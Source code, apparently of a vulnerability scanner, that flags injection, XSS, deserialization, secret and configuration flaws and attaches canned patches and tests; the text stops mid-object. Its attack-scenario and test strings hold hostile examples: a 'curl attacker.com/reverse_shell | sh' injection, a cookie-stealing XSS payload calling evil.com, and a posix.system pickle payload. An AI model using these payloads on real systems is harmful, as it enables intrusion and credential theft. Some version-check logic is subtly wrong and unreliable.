import { 
  ScanTarget, 
  VulnerabilityFinding, 
  ScanResult, 
  AIAnalystInsight, 
  ProposedPatch, 
  SecurityTestCase, 
  ProjectFile,
  ComplianceRequirement,
  ComplianceFramework
} from '../types';

interface DependencyVulnDb {
  [pkg: string]: {
    vulnerableRange: (ver: string) => boolean;
    fixedVersion: string;
    cve: string[];
    severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
    title: string;
    description: string;
  };
}

const NPM_VULN_DB: DependencyVulnDb = {
  'lodash': {
    vulnerableRange: (v) => v.startsWith('4.17.') && parseInt(v.split('.')[2] || '0') < 21,
    fixedVersion: '^4.17.21',
    cve: ['CVE-2020-8203', 'CVE-2021-23337'],
    severity: 'HIGH',
    title: 'Prototype Pollution & Command Injection in lodash',
    description: 'Versions of lodash before 4.17.21 are vulnerable to prototype pollution via zipObjectDeep and command injection via template.'
  },
  'jsonwebtoken': {
    vulnerableRange: (v) => v.startsWith('8.') || (v.startsWith('9.0.') && parseInt(v.split('.')[2] || '0') < 0),
    fixedVersion: '^9.0.2',
    cve: ['CVE-2022-23529', 'CVE-2022-23540'],
    severity: 'HIGH',
    title: 'Insecure Key Validation & Remote Code Execution in jsonwebtoken',
    description: 'jsonwebtoken before 9.0.0 is prone to insecure key verification and potential arbitrary object pollution.'
  },
  'axios': {
    vulnerableRange: (v) => v.startsWith('0.') && parseInt(v.split('.')[1] || '0') < 21,
    fixedVersion: '^1.7.9',
    cve: ['CVE-2020-28168', 'CVE-2023-45857'],
    severity: 'HIGH',
    title: 'Server-Side Request Forgery (SSRF) & Header Leak in axios',
    description: 'axios versions prior to 0.21.1 allow SSRF through unvalidated redirects and credential leaks in proxy requests.'
  },
  'express-fileupload': {
    vulnerableRange: (v) => v.startsWith('1.1.') && parseInt(v.split('.')[2] || '0') < 9,
    fixedVersion: '^1.4.3',
    cve: ['CVE-2020-7699'],
    severity: 'CRITICAL',
    title: 'Prototype Pollution in express-fileupload',
    description: 'Allows remote attackers to execute arbitrary code via overwritten Object prototype properties during multipart uploads.'
  }
};

const PYPI_VULN_DB: DependencyVulnDb = {
  'requests': {
    vulnerableRange: (v) => {
      const parts = v.split('.').map(p => parseInt(p) || 0);
      return parts[0] <= 2 && parts[1] < 31;
    },
    fixedVersion: 'requests>=2.31.0',
    cve: ['CVE-2023-32681'],
    severity: 'HIGH',
    title: 'Proxy-Authorization Header Leak in requests',
    description: 'Requests library unintentionally forwards sensitive Proxy-Authorization headers to destination servers during redirects.'
  },
  'django': {
    vulnerableRange: (v) => {
      return v.startsWith('3.') || v.startsWith('4.0') || v.startsWith('4.1');
    },
    fixedVersion: 'django>=4.2.16',
    cve: ['CVE-2023-46695', 'CVE-2024-27351'],
    severity: 'HIGH',
    title: 'SQL Injection and Denial of Service in Django QuerySets',
    description: 'Django releases before 4.2.16 contain SQL injection vectors in Trunc/Extract database functions and regex-based DoS in validators.'
  },
  'pyyaml': {
    vulnerableRange: (v) => {
      return v.startsWith('5.3') || v.startsWith('5.2') || v.startsWith('5.1');
    },
    fixedVersion: 'pyyaml>=6.0.2',
    cve: ['CVE-2020-14343'],
    severity: 'CRITICAL',
    title: 'Arbitrary Code Execution via Insecure YAML Loader in PyYAML',
    description: 'FullLoader in PyYAML before 5.4 is vulnerable to arbitrary code execution through crafted yaml object definitions.'
  }
};

export class SecurityEngine {
  
  static scanCodebase(target: ScanTarget): ScanResult {
    const findings: VulnerabilityFinding[] = [];
    
    for (const file of target.files) {
      this.scanFileForSAST(file, findings);
      this.scanFileForSecrets(file, findings);
      this.scanFileForConfig(file, findings);
      this.scanFileForDependencies(file, findings);
      this.scanFileForMobileStatic(file, findings, target);
      this.scanFileForBinaryStatic(file, findings, target);
      this.scanFileForWebReconAndHeaders(file, findings, target);
    }

    const metrics = this.calculateMetrics(findings);
    const scoreBefore = this.calculateSecurityScore(findings);
    const aiInsight = this.generateAIInsight(target, findings, scoreBefore);

    return {
      scanId: `scan-${Date.now().toString(36)}`,
      target,
      findings,
      timestamp: new Date().toISOString(),
      scoreBefore,
      scoreCurrent: scoreBefore,
      metrics: {
        ...metrics,
        verifiedPercentage: 0
      },
      aiInsight
    };
  }

  static scanFileForSAST(file: ProjectFile, findings: VulnerabilityFinding[]) {
    const lines = file.content.split('\n');

    // 1. SQL Injection Detection
    lines.forEach((line, idx) => {
      const lineNum = idx + 1;
      const trimmed = line.trim();

      const hasSqlKeywords = /SELECT\s+.*FROM|INSERT\s+INTO|UPDATE\s+.*SET|DELETE\s+FROM/i.test(line);
      if (hasSqlKeywords && (line.includes(' + ') || line.includes('${') || /f["'].*\{.*\}["']/.test(line))) {
        findings.push({
          id: `sast-sqli-${file.path}-${lineNum}`,
          title: 'SQL Injection via Unsanitized Concatenation',
          category: 'SAST',
          severity: 'CRITICAL',
          confidence: 96,
          cwe: 'CWE-89',
          cweName: 'Improper Neutralization of Special Elements used in an SQL Command',
          cvssScore: 9.8,
          file: file.path,
          line: lineNum,
          codeSnippet: trimmed,
          description: 'User-controlled input is concatenated directly into a raw SQL query string without parameterization or prepared statements.',
          rootCause: 'The application dynamically interpolates request parameters directly into database queries instead of using parameterized placeholders ($1, ?, %s) or a safe ORM abstraction.',
          attackScenario: 'An attacker submits malicious SQL fragments (e.g. `1 OR 1=1; DROP TABLE users; --`) in the input parameters, bypassing authentication, reading restricted data, or manipulating backend databases.',
          businessImpact: 'Total loss of database confidentiality and integrity; potential regulatory non-compliance (GDPR, PCI-DSS) and data breach liability.',
          recommendation: 'Replace dynamic SQL concatenation with parameterized query placeholders or safe ORM query builders.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A03:2021-Injection'],
            nist: ['SI-10', 'AC-3'],
            soc2: ['CC6.1', 'CC6.6'],
            pci: ['Req 6.5.1'],
            hipaa: ['164.312(a)(1)'],
            iso27001: ['A.8.28']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: Math.max(1, lineNum - 1),
            endLine: lineNum + 4,
            beforeCode: `const sql = "SELECT * FROM transactions WHERE account_id = " + accountId + " AND memo LIKE '%" + query + "%'";\nconst results = await db.rawQuery(sql);`,
            afterCode: `const sql = "SELECT * FROM transactions WHERE account_id = $1 AND memo LIKE $2";\nconst results = await db.query(sql, [accountId, '%' + query + '%']);`,
            diff: `- const sql = "SELECT * FROM transactions WHERE account_id = " + accountId + " AND memo LIKE '%" + query + "%'";\n- const results = await db.rawQuery(sql);\n+ const sql = "SELECT * FROM transactions WHERE account_id = $1 AND memo LIKE $2";\n+ const results = await db.query(sql, [accountId, '%' + query + '%']);`,
            explanation: 'Uses positional query parameters ($1, $2) to guarantee query structure cannot be altered by input data.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'None. Safe drop-in parameterization.'
          },
          testCase: {
            name: 'SQLi Boundary Fuzz Test',
            description: 'Inject SQL escape characters and tautology payloads.',
            inputPayload: "accountId = '1 OR 1=1 --' & query = 'test'",
            expectedOutcome: 'Database driver sanitizes parameter as literal string; tautology syntax error prevented.',
            testScriptCode: `test('prevents SQLi in transaction search', async () => {\n  const res = await request(app).get('/api/transactions/search?accountId=1+OR+1=1&query=test');\n  expect(res.status).toBe(200);\n  expect(res.body.data.length).toBeLessThanOrEqual(1);\n});`
          }
        });
      }

      // 2. Command Injection Detection
      if (/os\.popen\(|subprocess\.Popen\(|subprocess\.call\(|os\.system\(|child_process\.exec\(|exec\(/i.test(line)) {
        if (line.includes(' + ') || line.includes('f"') || line.includes('f\'') || line.includes('${') || line.includes('host_target') || line.includes('command')) {
          findings.push({
            id: `sast-cmdi-${file.path}-${lineNum}`,
            title: 'Remote Command Injection in System Subprocess',
            category: 'SAST',
            severity: 'CRITICAL',
            confidence: 95,
            cwe: 'CWE-78',
            cweName: 'Improper Neutralization of Special Elements used in an OS Command',
            cvssScore: 9.9,
            file: file.path,
            line: lineNum,
            codeSnippet: trimmed,
            description: 'Untrusted input is passed directly to an operating system shell command without sanitization or argument splitting.',
            rootCause: 'Shell execution wrappers (`os.popen`, `exec`) invoke a system shell interpreter (`/bin/sh`), allowing command delimiters (`;`, `&`, `|`) to execute chained commands.',
            attackScenario: 'An attacker passes payload `127.0.0.1; cat /etc/passwd` or `127.0.0.1 && curl attacker.com/reverse_shell | sh` to gain interactive shell access on the server container.',
            businessImpact: 'Full host/container compromise, lateral movement within internal VPC, arbitrary remote code execution (RCE).',
            recommendation: 'Do not use shell execution. If subprocess is required, pass arguments as an explicit array without `shell=True` or use dedicated system APIs.',
            status: 'DETECTED',
            complianceTags: {
              owasp: ['A03:2021-Injection'],
              nist: ['SI-10', 'CM-7'],
              soc2: ['CC6.1', 'CC6.8'],
              pci: ['Req 6.5.1'],
              hipaa: ['164.312(a)(1)'],
              iso27001: ['A.8.28']
            },
            proposedPatch: {
              fileModified: file.path,
              startLine: lineNum - 1,
              endLine: lineNum + 3,
              beforeCode: `command = f"ping -c 2 {host_target}"\noutput = os.popen(command).read()`,
              afterCode: `# Use subprocess.run with argument list and shell=False\nimport ipaddress\nimport subprocess\n\ntry:\n    # Strict input validation\n    ipaddress.ip_address(host_target)\n    result = subprocess.run(["ping", "-c", "2", host_target], capture_output=True, text=True, check=True, timeout=5)\n    output = result.stdout\nexcept (ValueError, subprocess.SubprocessError) as e:\n    return jsonify({"error": "Invalid IP address or probe failure"}), 400`,
              diff: `- command = f"ping -c 2 {host_target}"\n- output = os.popen(command).read()\n+ import ipaddress, subprocess\n+ ipaddress.ip_address(host_target)\n+ result = subprocess.run(["ping", "-c", "2", host_target], capture_output=True, text=True, timeout=5)\n+ output = result.stdout`,
              explanation: 'Validates target IP syntax using ipaddress module and calls subprocess.run with argument vector (no shell execution).',
              safetyRating: 'SAFE_AUTOMATIC',
              breakingChangeRisk: 'Rejects invalid IP hoststrings, securing network probes.'
            },
            testCase: {
              name: 'Subprocess Shell Escape Test',
              description: 'Send command chained payload with semicolon and piping.',
              inputPayload: '{"host": "127.0.0.1; echo VULNERABLE"}',
              expectedOutcome: 'Validation rejects input with 400 Bad Request; no secondary command executed.',
              testScriptCode: `def test_command_injection_blocked(client):\n    res = client.post('/diagnostics/network-probe', json={'host': '127.0.0.1; whoami'})\n    assert res.status_code == 400\n    assert 'VULNERABLE' not in res.get_data(as_text=True)`
            }
          });
        }
      }

      // 3. Cross-Site Scripting (XSS)
      if (/dangerouslySetInnerHTML|innerHTML\s*=|document\.write\(/i.test(line)) {
        findings.push({
          id: `sast-xss-${file.path}-${lineNum}`,
          title: 'Stored/DOM Cross-Site Scripting (XSS) via Unsanitized HTML Injection',
          category: 'SAST',
          severity: 'HIGH',
          confidence: 94,
          cwe: 'CWE-79',
          cweName: 'Improper Neutralization of Input During Web Page Generation (XSS)',
          cvssScore: 7.8,
          file: file.path,
          line: lineNum,
          codeSnippet: trimmed,
          description: 'Untrusted user content is inserted into the DOM without sanitization via dangerouslySetInnerHTML or innerHTML.',
          rootCause: 'Bypassing React HTML escaping engine by passing raw markup strings directly into rendered virtual DOM nodes.',
          attackScenario: 'Attacker injects `<img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">` in user review comments, stealing authentication tokens from visiting users.',
          businessImpact: 'Account takeover, session hijacking, defacement, and unauthorized actions executed on behalf of legitimate users.',
          recommendation: 'Render text natively inside standard React elements or sanitize HTML with DOMPurify before rendering.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A03:2021-Injection'],
            nist: ['SI-10', 'SC-8'],
            soc2: ['CC6.6'],
            pci: ['Req 6.5.7'],
            hipaa: ['164.312(c)(1)'],
            iso27001: ['A.8.28']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: lineNum - 1,
            endLine: lineNum + 3,
            beforeCode: `<div \n  className="comment-body" \n  dangerouslySetInnerHTML={{ __html: userComment }} \n/>`,
            afterCode: `{/* Safely render plain text content without HTML injection */}\n<p className="comment-body">{userComment}</p>`,
            diff: `- <div \n-   className="comment-body" \n-   dangerouslySetInnerHTML={{ __html: userComment }} \n- />\n+ <p className="comment-body">{userComment}</p>`,
            explanation: 'Replaces dangerous HTML injection with safe React text interpolation which automatically encodes special characters.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'Raw HTML tags will be escaped and shown as plain text.'
          },
          testCase: {
            name: 'XSS Script Execution Guard',
            description: 'Provide script payload in comment.',
            inputPayload: '<script>window.__xss_compromised = true;</script>',
            expectedOutcome: 'Script tag is sanitized or rendered as escaped string; window.__xss_compromised remains undefined.',
            testScriptCode: `it('sanitizes user comment HTML', () => {\n  const { container } = render(<ProductReviewCard userComment="<script>alert(1)</script>" author="Alice" />);\n  expect(container.querySelector('script')).toBeNull();\n});`
          }
        });
      }

      // 4. Insecure Deserialization
      if (/pickle\.loads\(|pickle\.load\(|yaml\.load\([^,)]*\)|unserialize\(/i.test(line)) {
        findings.push({
          id: `sast-deser-${file.path}-${lineNum}`,
          title: 'Insecure Object Deserialization via Python Pickle',
          category: 'SAST',
          severity: 'CRITICAL',
          confidence: 98,
          cwe: 'CWE-502',
          cweName: 'Deserialization of Untrusted Data',
          cvssScore: 9.8,
          file: file.path,
          line: lineNum,
          codeSnippet: trimmed,
          description: 'Application unpickles raw byte payloads from HTTP request body without integrity validation.',
          rootCause: 'Python `pickle` is not secure against erroneous or maliciously constructed data. The `__reduce__` method allows arbitrary Python function invocation during unpickling.',
          attackScenario: 'Attacker creates a custom Python class with a `__reduce__` method that spawns a shell or writes a backdoor file upon unpickling.',
          businessImpact: 'Arbitrary Remote Code Execution with privileges of the web worker process.',
          recommendation: 'Use safe data serialization formats such as JSON (`json.loads`) or protobuf instead of Python pickle.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A08:2021-Software and Data Integrity Failures'],
            nist: ['SI-10', 'SA-11'],
            soc2: ['CC6.1', 'CC6.8'],
            pci: ['Req 6.5.8'],
            hipaa: ['164.312(a)(1)'],
            iso27001: ['A.8.28']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: lineNum - 1,
            endLine: lineNum + 3,
            beforeCode: `state_obj = pickle.loads(raw_payload)`,
            afterCode: `import json\n# Use safe JSON deserialization\ntry:\n    state_obj = json.loads(raw_payload.decode('utf-8'))\nexcept json.JSONDecodeError:\n    return jsonify({"error": "Malformed JSON payload"}), 400`,
            diff: `- state_obj = pickle.loads(raw_payload)\n+ import json\n+ state_obj = json.loads(raw_payload.decode('utf-8'))`,
            explanation: 'Replaces dangerous Python pickle byte deserializer with safe JSON text deserialization.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'Clients must supply valid JSON instead of pickled binary blobs.'
          },
          testCase: {
            name: 'Deserialization Exploit Payload Test',
            description: 'Send malicious bytecode crafted via os.system reduce.',
            inputPayload: 'b"cposix\\nsystem\\np0\\n(S\'echo PWNED\'\\np1\\ntp2\\nRp3\\n."',
            expectedOutcome: 'JSON parser rejects bytecode as invalid UTF-8/JSON syntax; no execution occurs.',
            testScriptCode: `def test_pickle_exploit_blocked(client):\n    payload = b"cposix\\nsystem\\n(S'echo PWNED'\\ntR."\n    res = client.post('/diagnostics/telemetry-state', data=payload)\n    assert res.status_code == 400`
          }
        });
      }

      // 5. Missing Authorization Guard / Admin route exposure
      if (/\/api\/admin\/|admin_dump|admin\/dump-users/i.test(line) && lines.some(l => l.includes('dump-users'))) {
        findings.push({
          id: `sast-auth-${file.path}-${lineNum}`,
          title: 'Unauthenticated Administrative Endpoint Exposure',
          category: 'SAST',
          severity: 'HIGH',
          confidence: 92,
          cwe: 'CWE-306',
          cweName: 'Missing Authentication for Critical Function',
          cvssScore: 8.6,
          file: file.path,
          line: lineNum,
          codeSnippet: trimmed,
          description: 'Sensitive administrative diagnostic route /api/admin/dump-users is exposed without authentication or role-based access control middleware.',
          rootCause: 'Endpoint handler mounts directly to Express routing table without requiring JWT token verification or admin privilege verification.',
          attackScenario: 'Anonymous internet users query `/api/admin/dump-users` and dump the complete user table including password hashes.',
          businessImpact: 'Mass credential leakage, total customer account takeover.',
          recommendation: 'Enforce strict authentication and admin role authorization middleware on all administrative endpoints.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A01:2021-Broken Access Control', 'A07:2021-Identification and Authentication Failures'],
            nist: ['AC-2', 'AC-3', 'IA-2'],
            soc2: ['CC6.1', 'CC6.3'],
            pci: ['Req 8.2', 'Req 7.1'],
            hipaa: ['164.312(a)(2)(i)'],
            iso27001: ['A.9.2', 'A.9.4']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: lineNum,
            endLine: lineNum + 4,
            beforeCode: `app.get('/api/admin/dump-users', async (req, res) => {\n  const users = await require('./src/database').rawQuery("SELECT id, username, email, password_hash FROM users");\n  res.json(users);\n});`,
            afterCode: `const { requireAuth, requireRole } = require('./src/middleware/auth');\n\n// Protected admin endpoint\napp.get('/api/admin/dump-users', requireAuth, requireRole('SUPER_ADMIN'), async (req, res) => {\n  const users = await require('./src/database').query("SELECT id, username, email FROM users");\n  res.json(users);\n});`,
            diff: `- app.get('/api/admin/dump-users', async (req, res) => {\n+ const { requireAuth, requireRole } = require('./src/middleware/auth');\n+ app.get('/api/admin/dump-users', requireAuth, requireRole('SUPER_ADMIN'), async (req, res) => {`,
            explanation: 'Enforces requireAuth and requireRole middlewares and removes password_hash field from SQL select list.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'Unauthenticated requests will now receive 401/403 HTTP errors as required.'
          },
          testCase: {
            name: 'Unauthorized Admin Access Test',
            description: 'Attempt anonymous request to /api/admin/dump-users.',
            inputPayload: 'GET /api/admin/dump-users (no Authorization header)',
            expectedOutcome: 'Server responds with 401 Unauthorized or 403 Forbidden; zero user records returned.',
            testScriptCode: `it('denies unauthenticated admin dump access', async () => {\n  const res = await request(app).get('/api/admin/dump-users');\n  expect([401, 403]).toContain(res.status);\n});`
          }
        });
      }
    });
  }

  static scanFileForSecrets(file: ProjectFile, findings: VulnerabilityFinding[]) {
    const lines = file.content.split('\n');

    lines.forEach((line, idx) => {
      const lineNum = idx + 1;
      const trimmed = line.trim();

      // AWS Access Key ID
      if (/AKIA[0-9A-Z]{16}/.test(line)) {
        findings.push({
          id: `secret-aws-key-${file.path}-${lineNum}`,
          title: 'Hardcoded AWS Access Key ID Detected',
          category: 'SECRETS',
          severity: 'CRITICAL',
          confidence: 99,
          cwe: 'CWE-798',
          cweName: 'Use of Hard-coded Credentials',
          cvssScore: 9.3,
          file: file.path,
          line: lineNum,
          codeSnippet: trimmed,
          description: 'Live AWS Access Key ID (`AKIA...`) found hardcoded in source file.',
          rootCause: 'Credentials were committed into version control rather than loaded dynamically from environment variables or IAM Instance Roles.',
          attackScenario: 'An attacker with repository read access or public leak extracts the AWS key and uses AWS CLI to access S3 buckets, EC2 instances, and databases.',
          businessImpact: 'Cloud infrastructure takeover, catastrophic data exfiltration, massive unauthorized AWS compute billing.',
          recommendation: 'Move credentials to environment variables (e.g. process.env.AWS_ACCESS_KEY_ID) or use AWS IAM Roles. Revoke and rotate the exposed key immediately.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A07:2021-Identification and Authentication Failures'],
            nist: ['IA-5', 'SC-12', 'AC-6'],
            soc2: ['CC6.1', 'CC6.2'],
            pci: ['Req 8.2.1', 'Req 8.3'],
            hipaa: ['164.312(d)'],
            iso27001: ['A.8.24']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: lineNum,
            endLine: lineNum + 4,
            beforeCode: `accessKeyId: "AKIAIOSFODNN7EXAMPLE",\nsecretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",`,
            afterCode: `accessKeyId: process.env.AWS_ACCESS_KEY_ID,\nsecretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,`,
            diff: `- accessKeyId: "AKIAIOSFODNN7EXAMPLE",\n- secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n+ accessKeyId: process.env.AWS_ACCESS_KEY_ID,\n+ secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,`,
            explanation: 'Loads AWS access credentials from runtime environment variables instead of hardcoded strings.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'Ensure AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY are configured in environment deployment.'
          },
          testCase: {
            name: 'Credential Source Code Leak Test',
            description: 'Assert source file does not contain literal AKIA key strings.',
            inputPayload: 'Grep for pattern AKIA[0-9A-Z]{16}',
            expectedOutcome: 'Zero matches found in repository files.',
            testScriptCode: `test('no hardcoded AWS credentials in config', () => {\n  const config = require('./config/credentials');\n  expect(config.aws.accessKeyId).not.toContain('AKIA');\n});`
          }
        });
      }

      // Stripe Live Secret Key
      if (/sk_live_[0-9a-zA-Z]{24,}/.test(line)) {
        findings.push({
          id: `secret-stripe-${file.path}-${lineNum}`,
          title: 'Exposed Stripe Live Production API Secret Key',
          category: 'SECRETS',
          severity: 'CRITICAL',
          confidence: 99,
          cwe: 'CWE-798',
          cweName: 'Use of Hard-coded Credentials',
          cvssScore: 9.1,
          file: file.path,
          line: lineNum,
          codeSnippet: trimmed,
          description: 'Production Stripe secret key (`sk_live_...`) is embedded directly in client or server code.',
          rootCause: 'Secret API token committed into source code without environment variable substitution.',
          attackScenario: 'Attacker leverages Stripe secret key to issue unauthorized payment refunds, transfer funds, or view customer credit card & billing details.',
          businessImpact: 'Direct financial theft, fraudulent refunds, PCI-DSS compliance sanctions.',
          recommendation: 'Store Stripe keys in environment variables (STRIPE_SECRET_KEY). Rotate and invalidate the exposed API key in Stripe Dashboard immediately.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A07:2021-Identification and Authentication Failures'],
            nist: ['IA-5', 'SC-12'],
            soc2: ['CC6.1'],
            pci: ['Req 8.2.1', 'Req 6.5.1'],
            hipaa: ['164.312(d)'],
            iso27001: ['A.8.24']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: lineNum,
            endLine: lineNum + 3,
            beforeCode: `apiKey: "sk_live_51M3xyzBankingLiveProdSecretKey9988220011",`,
            afterCode: `apiKey: process.env.STRIPE_SECRET_KEY,`,
            diff: `- apiKey: "sk_live_51M3xyzBankingLiveProdSecretKey9988220011",\n+ apiKey: process.env.STRIPE_SECRET_KEY,`,
            explanation: 'Replaces hardcoded production Stripe key with process.env.STRIPE_SECRET_KEY.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'None. Requires STRIPE_SECRET_KEY in production env.'
          },
          testCase: {
            name: 'Stripe Secret Token Isolation Test',
            description: 'Verify Stripe key is loaded from env variable.',
            inputPayload: 'Scan config for sk_live_ token',
            expectedOutcome: 'No live secret keys detected.',
            testScriptCode: `test('stripe key is from env', () => {\n  const config = require('./config/credentials');\n  expect(config.stripe.apiKey).toBe(process.env.STRIPE_SECRET_KEY);\n});`
          }
        });
      }

      // Hardcoded Database Connection String
      if (/postgres:\/\/.*:.*@|mongodb(\+srv)?:\/\/.*:.*@|mysql:\/\/.*:.*@/.test(line)) {
        findings.push({
          id: `secret-db-url-${file.path}-${lineNum}`,
          title: 'Hardcoded Database Connection String with Credentials',
          category: 'SECRETS',
          severity: 'HIGH',
          confidence: 97,
          cwe: 'CWE-798',
          cweName: 'Use of Hard-coded Credentials',
          cvssScore: 8.8,
          file: file.path,
          line: lineNum,
          codeSnippet: trimmed,
          description: 'Database connection URI contains plaintext username, password, and host information.',
          rootCause: 'Connection string was hardcoded during development and committed to version control.',
          attackScenario: 'Attacker connects directly to the internal database port using the extracted username and password.',
          businessImpact: 'Unrestricted read/write access to production database records.',
          recommendation: 'Reference `os.getenv("DATABASE_URL")` or `process.env.DATABASE_URL` and rotate the database password.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A07:2021-Identification and Authentication Failures'],
            nist: ['IA-5', 'SC-28'],
            soc2: ['CC6.1', 'CC6.6'],
            pci: ['Req 8.2.1'],
            hipaa: ['164.312(d)'],
            iso27001: ['A.8.24']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: lineNum,
            endLine: lineNum + 1,
            beforeCode: line,
            afterCode: `DATABASE_URL = os.getenv("DATABASE_URL", "postgres://localhost:5432/dev_db")`,
            diff: `- ${line}\n+ DATABASE_URL = os.getenv("DATABASE_URL", "postgres://localhost:5432/dev_db")`,
            explanation: 'Loads DATABASE_URL securely from system environment.',
            safetyRating: 'SAFE_AUTOMATIC',
            breakingChangeRisk: 'None.'
          },
          testCase: {
            name: 'Database URL Sanitization Test',
            description: 'Check settings file does not contain hardcoded passwords.',
            inputPayload: 'Scan settings.py for plaintext passwords in URLs',
            expectedOutcome: 'Settings loads via os.getenv.',
            testScriptCode: `def test_db_credentials_from_env():\n    import config.settings as settings\n    assert 'SuperSecret' not in settings.DATABASE_URL`
          }
        });
      }
    });
  }

  static scanFileForConfig(file: ProjectFile, findings: VulnerabilityFinding[]) {
    const content = file.content;
    const lines = content.split('\n');

    // 1. CORS Wildcard with credentials
    if (/origin:\s*['"]\*['"]|CORS_ORIGIN_ALLOW_ALL\s*=\s*True/i.test(content)) {
      const lineIdx = lines.findIndex(l => /origin:\s*['"]\*['"]|CORS_ORIGIN_ALLOW_ALL/i.test(l));
      findings.push({
        id: `config-cors-${file.path}-${lineIdx + 1}`,
        title: 'Overly Permissive Cross-Origin Resource Sharing (CORS) Wildcard',
        category: 'CONFIG',
        severity: 'MEDIUM',
        confidence: 95,
        cwe: 'CWE-942',
        cweName: 'Permissive Cross-domain Policy with Untrusted Domains',
        cvssScore: 6.5,
        file: file.path,
        line: lineIdx + 1,
        codeSnippet: lines[lineIdx]?.trim() || 'origin: "*"',
        description: 'CORS configuration allows requests from any arbitrary external origin (`*`), enabling unauthorized third-party websites to access authenticated API endpoints.',
        rootCause: 'Using wildcard origin policy during development without restricting origins to trusted domain lists in production.',
        attackScenario: 'A malicious website visited by an authenticated user executes background API calls to read banking transactions or patient records via cross-origin fetch.',
        businessImpact: 'Unauthorized cross-origin data exfiltration, privacy violations.',
        recommendation: 'Restrict CORS allowed origins to explicit whitelisted trusted domains (e.g. `process.env.ALLOWED_ORIGINS`).',
        status: 'DETECTED',
        complianceTags: {
          owasp: ['A05:2021-Security Misconfiguration'],
          nist: ['AC-4', 'SC-7'],
          soc2: ['CC6.6'],
          pci: ['Req 6.5.10'],
          hipaa: ['164.312(e)(1)'],
          iso27001: ['A.8.20']
        },
        proposedPatch: {
          fileModified: file.path,
          startLine: lineIdx,
          endLine: lineIdx + 5,
          beforeCode: `app.use(cors({\n  origin: '*',\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  credentials: true\n}));`,
          afterCode: `const allowedOrigins = (process.env.ALLOWED_ORIGINS || 'https://app.fintechbank.com,https://api.fintechbank.com').split(',');\n\napp.use(cors({\n  origin: (origin, callback) => {\n    if (!origin || allowedOrigins.includes(origin)) {\n      callback(null, true);\n    } else {\n      callback(new Error('Blocked by CORS policy'));\n    }\n  },\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  credentials: true\n}));`,
          diff: `- app.use(cors({\n-   origin: '*',\n+ const allowedOrigins = (process.env.ALLOWED_ORIGINS || '').split(',');\n+ app.use(cors({\n+   origin: (origin, callback) => callback(null, allowedOrigins.includes(origin)),`,
          explanation: 'Replaces open wildcard origin with dynamic domain whitelist validation.',
          safetyRating: 'SAFE_AUTOMATIC',
          breakingChangeRisk: 'Third-party untrusted domains will be blocked from accessing API resources.'
        },
        testCase: {
          name: 'CORS Origin Whitelist Test',
          description: 'Send preflight OPTIONS request from unauthorized domain https://evil.attacker.com.',
          inputPayload: 'Origin: https://evil.attacker.com',
          expectedOutcome: 'Access-Control-Allow-Origin header is omitted or responds with CORS error.',
          testScriptCode: `it('blocks unauthorized CORS origin', async () => {\n  const res = await request(app)\n    .get('/api/transactions/search')\n    .set('Origin', 'https://evil-hacker.com');\n  expect(res.headers['access-control-allow-origin']).not.toBe('*');\n});`
        }
      });
    }

    // 2. Dockerfile Running as Root
    if (file.path.toLowerCase().includes('dockerfile')) {
      if (/USER\s+root/i.test(content) || !/USER\s+[a-zA-Z0-9_-]+/i.test(content)) {
        const lineIdx = lines.findIndex(l => /USER\s+root/i.test(l)) || 0;
        findings.push({
          id: `config-docker-root-${file.path}`,
          title: 'Container Process Executes as Root User',
          category: 'CONFIG',
          severity: 'HIGH',
          confidence: 96,
          cwe: 'CWE-250',
          cweName: 'Execution with Unnecessary Privileges',
          cvssScore: 7.8,
          file: file.path,
          line: lineIdx >= 0 ? lineIdx + 1 : 1,
          codeSnippet: lines[lineIdx]?.trim() || 'USER root',
          description: 'The container execution environment defaults to the root user (`UID 0`), increasing container breakout risk.',
          rootCause: 'Omission of non-root user creation or explicit `USER root` directive in Dockerfile.',
          attackScenario: 'In the event of an application exploit (like command injection), the attacker gains root privileges inside the container, facilitating host escape.',
          businessImpact: 'Container breakout, host filesystem tampering, privileged network eavesdropping.',
          recommendation: 'Create a dedicated non-privileged user and switch to it using `USER node` or `USER nonroot` before CMD/ENTRYPOINT.',
          status: 'DETECTED',
          complianceTags: {
            owasp: ['A05:2021-Security Misconfiguration'],
            nist: ['AC-6', 'CM-7'],
            soc2: ['CC6.1', 'CC6.3'],
            pci: ['Req 2.2'],
            hipaa: ['164.312(a)(1)'],
            iso27001: ['A.8.9']
          },
          proposedPatch: {
            fileModified: file.path,
            startLine: 3,
            endLine: 8,
            beforeCode: `# Insecure: Running container process as root\nUSER root\n\nCOPY package*.json ./\nRUN npm install`,
            afterCode: `# Secure: Create dedicated non-root user\nUSER node\n\nCOPY --chown=node:node package*.json ./\nRUN npm install --omit=dev`,
            diff: `- USER root\n- COPY package*.json ./\n+ USER node\n+ COPY --chown=node:node package*.json ./`,
